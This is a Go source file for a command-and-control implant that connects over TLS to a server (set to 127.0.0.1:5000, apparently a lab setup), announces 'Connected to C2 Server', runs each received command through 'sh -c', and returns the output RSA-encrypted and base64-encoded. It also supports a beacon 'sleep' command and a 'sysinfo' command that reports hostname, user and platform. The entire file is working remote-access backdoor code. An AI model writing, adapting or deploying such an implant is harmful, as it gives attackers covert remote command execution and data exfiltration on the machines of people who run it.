package main

import (
	"bufio"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"time"
)

var (
	publicKey     *rsa.PublicKey
	sleepInterval time.Duration
)

func main() {
	baseDir := getBaseDir()
	loadPublicKey(filepath.Join(baseDir, "certs", "rsa_public.pem"))
	serverAddr := "127.0.0.1:5000"

	sleepInterval = 0

	caCert, err := os.ReadFile(filepath.Join(baseDir, "certs", "server.crt"))
	if err != nil {
		panic(err)
	}
	certPool := x509.NewCertPool()
	certPool.AppendCertsFromPEM(caCert)

	config := &tls.Config{RootCAs: certPool}
	conn, err := tls.Dial("tcp", serverAddr, config)
	if err != nil {
		fmt.Println("[-] Failed to connect")
		return
	}
	defer conn.Close()

	fmt.Println("[+] Connected to C2 Server")
	reader := bufio.NewReader(conn)
	for {
		command, err := receiveCommand(reader)
		if err != nil {
			fmt.Println("[-] Connection closed")
			break
		}
		if command == "" {
			continue
		}
		output := executeCommand(command)
		encrypted, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, publicKey, []byte(output), nil)
		if err != nil {
			fmt.Println("[-] Encryption failed")
			continue
		}
		b64 := base64.StdEncoding.EncodeToString(encrypted)
		conn.Write([]byte(b64 + "\n"))
		time.Sleep(sleepInterval)
	}
}

func loadPublicKey(path string) {
	keyData, err := os.ReadFile(path)
	if err != nil {
		panic(err)
	}

	block, _ := pem.Decode(keyData)
	if block == nil {
		panic("[-] Failed to decode RSA public key")
	}

	pub, err := x509.ParsePKCS1PublicKey(block.Bytes)
	if err != nil {
		panic(err)
	}
	publicKey = pub
}

func receiveCommand(r *bufio.Reader) (string, error) {
	line, err := r.ReadString('\n')
	if err != nil {
		return "", err
	}
	return strings.TrimSpace(line), nil
}

func executeCommand(cmd string) string {
	if strings.HasPrefix(cmd, "sleep ") {
		parts := strings.SplitN(cmd, " ", 2)
		if len(parts) == 2 {
			if sec, err := strconv.Atoi(strings.TrimSpace(parts[1])); err == nil {
				sleepInterval = time.Duration(sec) * time.Second
				return fmt.Sprintf("[+] Sleep set to %ds", sec)
			}
		}
		return "[-] Invalid sleep command"
	}

	if cmd == "sysinfo" {
		return getSysInfo()
	}

	out, err := exec.Command("sh", "-c", cmd).CombinedOutput()
	if err != nil {
		return fmt.Sprintf("[-] Command execution failed: %v", err)
	}
	return string(out)
}

func getSysInfo() string {
	host, _ := os.Hostname()
	user := os.Getenv("USER")
	return fmt.Sprintf("hostname: %s\nuser: %s\nos: %s\narch: %s", host, user, runtime.GOOS, runtime.GOARCH)
}

func getBaseDir() string {
	exe, err := os.Executable()
	if err != nil {
		return "."
	}
	return filepath.Dir(exe)
}
